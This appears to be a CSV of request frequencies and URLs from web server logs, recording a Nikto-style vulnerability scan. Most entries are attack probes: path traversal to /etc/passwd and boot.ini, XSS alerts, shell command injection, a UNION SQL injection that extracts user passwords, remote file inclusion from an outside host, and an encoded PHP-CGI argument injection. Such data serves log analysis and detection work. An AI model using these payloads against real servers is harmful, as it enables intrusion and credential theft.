Frequency,Resource
1,/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>
1,/cgi-bin/YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
1,main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
1,/../../../../../windows/win.ini
1,/cgi-bin/../abyss.conf
1,/vgn/asp/previewer
1,/webmail/horde/test.php
1,/profile.php?u=fL2ak4pL
1,generate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1
1,////./../.../boot.ini
1,/exchange/lib/AMPROPS.INC
1,mt-static/mt.cfg
1,/siteminder
1,/events4.nsf
1,bizdb1-search.cgi
2,/myadmin/scripts/setup.php
1,/cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
1,/voice/
1,/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>
1,/midicart.mdb
1,ssi//../../../../../../../etc/passwd
1,/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd
1,/cgi-bin/plusmail
1,/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test
1,/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd
1,/cgi-bin/db4web_c/dbdirNikto//etc/passwd
1,wconsole.dll
1,/cgi-bin/vpasswd.cgi
1,/cgi-bin/view-source
1,/cgi-bin/htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E
1,/servlet/org.apache.catalina.ContainerServlet/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/index.html
3,http://httpheader.net/
1,/scripts/samples/search/queryhit.idq
1,ans/ans.pl?p=../../../../../usr/bin/id|&blah
1,search.php?searchstring=<script>alert(document.cookie)</script>
1,/admentor/adminadmin.asp
1,/cgi-bin/bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
1,/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
4,/setup.php
2,cgiwrap/~sys
1,ImageFolio/admin/admin.cgi
2,/path/nw/article.php?id='
1,/splashAdmin.php
1,/servlet/webacc?User.html=noexist
1,cmd1.exe?/c+dir
1,/TvLBvkHh.printer
1,/c/winnt/system32/cmd.exe?/c+dir+/OG
1,/cgi-bin/whois.cgi?action=load&whois=%3Bid
1,/TvLBvkHh.list
1,/cgi-bin/perl?-v
1,/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.nsf
1,/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit
1,webplus.exe?about
1,/cgi-bin/ssi//../../../../../../../etc/passwd
1,/cgi-bin/virgil.cgi
1,stat.pl
1,/index.php?file=index.php
1,traffic.cgi?cfg=../../../../../../../../etc/passwd
1,vpasswd.cgi
1,/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd
1,/TiVoConnect?Command=QueryContainer&Container=/&Recurse=Yes
1,/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&
1,/uploadx.asp
1,/SilverStream/Meta/Tables/?access-mode=text
1,/exchange/lib/JSROOT.INC
1,/cgi-bin/info2www
1,/prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/ammerum/
1,/index.jhtml
1,common/listrec.pl
1,/TvLBvkHh.htaccess
1,/cgi-bin/sbcgi/sitebuilder.cgi
2,/db/index.php
1,/cgi-bin/calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/vgn/previewer
2,/mysqladmin/index.php
1,search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
1,/TvLBvkHh.php
2,/hndUnblock.cgi
1,orders/orders.txt
1,/names.nsf
1,/scripts/iisadmin/ism.dll
1,/TvLBvkHh.rdf+destype=cache+desformat=PDF
3,/cgi-bin/cgiwrap/~root
1,/TvLBvkHh.log
1,/phpBB2/search.php?search_id=1\\
1,shopper.cgi?newpage=../../../../../../../../../../etc/passwd
1,/cgi-bin/input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/quikstore.cfg
1,/somethingnotthere.ida
1,/cplogfile.log
1,/index.cgi
2,/admin/mysql2/index.php
1,/index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search
1,/spa122/
1,/whatever.htr
1,/TvLBvkHh.pt-br
1,/TvLBvkHh.tw
1,hpnst.exe?c=p+i=SrvSystemInfo.html
1,/examples/jsp/snp/anything.snp
1,/cgis/
1,/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>
1,/index.php?download=/etc/passwd
2,/upload/bank-icons/bank_16.png
1,/cgi-bin/processit.pl
2,/x
1,/cgi-bin/mt-static/mt-check.cgi
1,gm-cplog.cgi
1,faxsurvey?cat%20/etc/passwd
1,/cgi-win/cgitest.exe
1,rpm_query
1,/panasonic/
2,cgiwrap/~lp
1,/cgi-bin/emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/wx/s.dll?d=/boot.ini
1,architext_query.cgi
1,/%5BSecCheck%5D/..%255c..%255c../ext.ini
1,/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x
1,/SiteServer/Admin/commerce/foundation/domain.asp
1,/TvLBvkHh.sh
1,/VoIP/
1,/_vti_bin/shtml.exe
2,/cgi-bin/cgiwrap/~listen
1,/default.php?info_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
1,/TvLBvkHh.se
1,"/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,/whateverdXHZ.html
2,/xampp/phpmyadmin/index.php
1,/a%5C.aspx
1,/cfdocs/snippets/gettempdirectory.cfm
1,/cgi-bin/data/fetch.php?page=
1,/webadmin.nsf
1,/forums//phpmyadmin/config.php
1,"/cgi-bin/athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['"
1,/TvLBvkHh.save
1,/cgi-bin/csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/basilix/message-read.php3
5,/php-my-admin/scripts/setup.php
1,/uploadn.asp
1,/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
1,/vgn/ac/fsave
1,/RELEASE-NOTES.txt
1,betsie/parserl.pl/%3Cscript%3Ealert('Vulnerable')%3C/script%3E;
1,/TvLBvkHh.properties
1,/852566C90012664F
1,db4web_c/dbdirname//etc/passwd
1,/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd
1,main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
1,/cfdocs/snippets/viewexample.cfm
1,/home.asp
1,FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/PlcmSpIp/
1,/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>
1,/cgi-bin/mgrqcgi
1,mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
1,/search/sqlqhit.asp
1,/vgn/vr/Editing
1,/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor
1,/pbserver/pbserver.dll
3,cgiwrap/~root
1,"/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00
1,/%25NETHOOD%25/
1,test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/TiVoConnect?Command=QueryServer
1,/db/users.dat
1,/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/cfappman/index.cfm
1,"/administrator/gallery/gallery.php?directory=\""<script>alert(document.cookie)</script>"
1,/cersvr.nsf
1,wrap.cgi
1,aglimpse
1,/cgi-bin/webdist.cgi
1,/cgi-bin/mailnews.cgi
1,whois.cgi?action=load&whois=%3Bid
1,/scripts/proxy/w3proxy.dll
1,perl.exe?-v
1,/prov/
1,/statrep.nsf
1,/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/filemanager/filemanager_forms.php?lib_path=http://cirt.net/rfiinc.txt?
1,/TvLBvkHh.box
1,/cgi-bin/stat.pl
1,/SilverStream
1,/../../../../../../../../../boot.ini
1,quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
1,/pma/index.php
1,urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E
1,/TvLBvkHh.cnf
1,/moo
2,"/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\""><script>alert(document.cookie)</script>"
1,webfind.exe?keywords=01234567890123456789
1,/cgi-bin/shtml.dll
1,/perl/-e%20print%20Hello
1,whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,index.js0x70
1,/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
1,/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1
1,/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|
1,/cgi-bin/date
1,/cgibin/
1,/TvLBvkHh.fhp
1,"/downloads/pafiledb.php?action=rate&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,/TvLBvkHh.Big5
1,/tree
5,/scripts/setup.php
1,/TvLBvkHh.
1,/TvLBvkHh/
1,/cgi-bin/AT-admin.cgi
2,/admin/PMA/index.php
1,/TvLBvkHh.access
1,bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
2,/mysql/index.php
1,/TvLBvkHh.inc+
1,formmail
1,/comments/browse.php?fid=2&tid=4&go=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
1,DCShop/orders/orders.txt
1,/launch.asp?NFuse_Application=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.exe
1,/webcart/orders/
1,/cgi-bin/icat
1,lwgate
1,/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
1,/cgi-bin/dansguardian.pl?DENIEDURL=</a><script>alert('Vulnerable');</script>
1,uploader.exe
1,/cgi-exe/
1,/catinfo?<u><b>TESTING
1,/cgi-bin/viralator.cgi
2,/cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
1,/jigsaw/
1,/cgi-bin/com5.java
1,/user.php?op=userinfo&uname=<script>alert('hi');</script>
1,generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
1,/aastra/
1,/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>
1,//comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,awstats/awstats.pl
1,gm-authors.cgi
1,/TvLBvkHh.cwr
1,/cgi-bin/fom/fom.cgi?cmd=<script>alert('Vulnerable')</script>&file=1&keywords=vulnerable
1,/cgi-bin/admin/setup.cgi
1,wais.pl
2,cgiwrap/~daemon
1,/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1
5,/phpMyAdmin/scripts/_setup.php
2,/getcfg.php
1,classifieds/index.cgi
1,/TvLBvkHh.nsfdeslo
1,/images
2,/download.php?op=viewdownload
1,/index.php?download=/windows/win.ini
1,/pccsmysqladm/incs/dbconnect.inc
1,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=
1,flexform.cgi
1,/ISSamples/sqlqhit.asp
1,/examples/basic/servlet/HelloServlet
2,/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
1,Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
1,/cgi-bin/cgiwrap/%3Cfont%20color=red%3E
1,/examples/servlet/TroubleShooter
1,/prd.i/pgen/
1,modules/vwar/admin/config.php
1,/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
1,/admin/config.php
1,/phpmyadmin/phpmyadmin/index.php
1,/uySJie59sZ
1,test-cgi?/*
1,/nsn/..%5Cutil/md.bas
1,/php/php.exe?c:\boot.ini
1,/TvLBvkHh.htpasswd
1,"/downloads/pafiledb.php?action=email&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,htsearch?exclude=%60/etc/passwd%60
1,/test.php%20
1,webdist.cgi?distloc=;cat%20/etc/passwd
1,/vgn/jsp/jspstatus
2,cgiwrap/~bin
2,cgiwrap/~listen
1,/setup.nsf
1,/cgi-bin/SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
1,/chat/!pwds.txt
1,/cgi-bin/cachemgr.cgi
1,/cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah
1,/author.asp
1,/default.aspx
1,/web-console/ServerInfo.jsp%00
1,"/ca000007.pl?ACTION=SHOWCART&REFPAGE=\""><script>alert('Vulnerable')</script>"
1,/cbms/cbmsfoot.php
1,/index.cfm
1,/nsn/..%5Cutil/copy.bas
1,/provision/
1,htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E
5,/phpMyAdmin2/scripts/setup.php
1,/servlet/org.apache.catalina.Context/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
1,/vvx500/
2,/www/phpMyAdmin/index.php
1,/cgi-bin/fom.cgi?file=<script>alert('Vulnerable')</script>
1,"/cgi-bin/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3"
1,/ht_root/wwwroot/-/local/httpd$map.conf
1,.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
1,/cgi-bin/cgiwrap
1,/cgi-bin/campas?%0acat%0a/etc/passwd%0a
1,//cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
1,calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/nsn/..%5Cutil/dir.bas
1,/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
1,/webcart/orders/import.txt
1,/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd
1,/ariadne/
1,/unauthenticated/provisioning/
1,/................../etc/passwd
1,/junk988.aspx
1,/wa.exe
1,html2wml.cgi
2,/claroline/phpMyAdmin/index.php
1,sendtemp.pl?templ=../../../../../../../../../../etc/passwd
1,/cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00
1,/TvLBvkHh.db
1,/help.html
1,/cgi-bin/WS_FTP.ini
2,/index.asp
1,/cfdocs/expeval/sendmail.cfm
1,LWGate
1,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>
1,/forums//adm/config.php
2,cgiwrap/~adm
1,/cgi-bin/scoadminreg.cgi
1,"sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1"
1,/cgi-bin/MsmMask.exe
1,/dms/
2,/web/phpMyAdmin/index.php
1,/vgn/style
1,/cgi-bin/view-source?view-source
1,/cgi-bin/start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
2,/admin/phpmyadmin2/index.php
1,spin_client.cgi?aaaaaaaa
1,/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
1,/index.php?sql_debug=1
1,/cisco/
143,index.html
1,ezboard.cgi
1,/cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd
2,/hostadmin/?page='
1,/recordings/theme/iefixes.css
1,/TvLBvkHh.dtd
1,/megabook/admin.cgi?login=<script>alert('Vulnerable')</script>
1,/vgn/license
1,/cgi-bin/com5.pl
1,view-source?view-source
1,/basilix/mbox-list.php3
1,//profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/basilix/compose-attach.php3
1,/securecontrolpanel/
1,/cgi-bin/mt-static/mt-load.cgi
1,/polycomvvx/
1,/vgn/asp/MetaDataUpdate
1,/ws_ftp.ini
1,/html/cgi-bin/cgicso?query=AAA
1,publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
1,/ows-bin/
1,/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>
1,/scripts/db4web_c.exe/dbdirname/c:%5Cboot.ini
1,/interscan/
1,/forum/admin/wwforum.mdb
1,search.pl?Realm=All&Match=0&Terms=test&nocpp=1&maxhits=10&;Rank=<script>alert('Vulnerable')</script>
1,fom.cgi?file=<script>alert('Vulnerable')</script>
1,/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.LCDispatcher
1,/index.php?|=../../../../../../../../../etc/passwd
1,/cgi-bin/cgiwrap/~ZA3Z1
1,/TvLBvkHh.render_css
1,/TvLBvkHh.orig
1,faqmanager.cgi?toc=/etc/passwd%00
1,/scozbook/view.php?PG=whatever
1,/cgi-bin/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.blt
1,finger
1,/.cobalt/sysManage/../admin/.htaccess
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx?aspxerrorpath=null
1,/w-agora/
1,/TvLBvkHh.et
1,/TvLBvkHh.nlm
1,/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html
1,/TvLBvkHh.es
1,/SIPCfg
1,/TvLBvkHh.txt
1,/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>
1,/phprov/
1,/phpmyadmin
1,/TvLBvkHh.sqlite
2,/%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/WS_FTP.ini
1,/search/SQLQHit.asp
1,mgrqcgi
1,/cgi-bin/ezman.cgi
1,generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
1,/DB4Web/10.10.10.10:100
1,book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
1,/TvLBvkHh.iso8859-2
1,/TvLBvkHh.vts
1,/TvLBvkHh.iso8859-8
1,"sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3"
2,cgiwrap/~mysql
1,/cgi-bin/download.cgi
2,/cgi-bin/cgiwrap/~noaccess
1,admin/setup.cgi
1,/cgi-bin/webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/config/
